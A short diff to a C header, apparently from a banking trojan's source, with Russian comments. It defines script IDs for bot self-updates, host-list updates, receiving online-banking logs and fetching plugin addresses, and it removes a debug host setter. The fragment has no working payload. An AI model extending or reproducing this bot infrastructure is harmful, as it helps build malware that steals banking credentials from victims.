@@ -68,7 +68,7 @@
 #define SCRIPT_UPDATE_HOSTS  13 /* Скрипт обновления списка хостов */
 #define SCRIPT_UPDATE_BOT    14 /* Скрипт  автоматического обновления ботов */
 #define SCRIPT_IBANK_LOG     15 /* Скрипт приёма логов ибанка */
-
+#define SCRIPT_PLUGIN        16 /* Скрипт получения адеса одного плагина */
 
 
 // Максимальные размеры массивов с данными
@@ -286,11 +286,6 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize);
 //------------------------------------------------------------------------
 BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param);
 
-
-// В отладочном режиме предоставляем возможность установить отладочный хост
-#ifdef DEBUGCONFIG
-void SetDebugHost(PCHAR Host);
-#endif
 
 //описана в BotCore.h
 extern char BOT_UID[128];
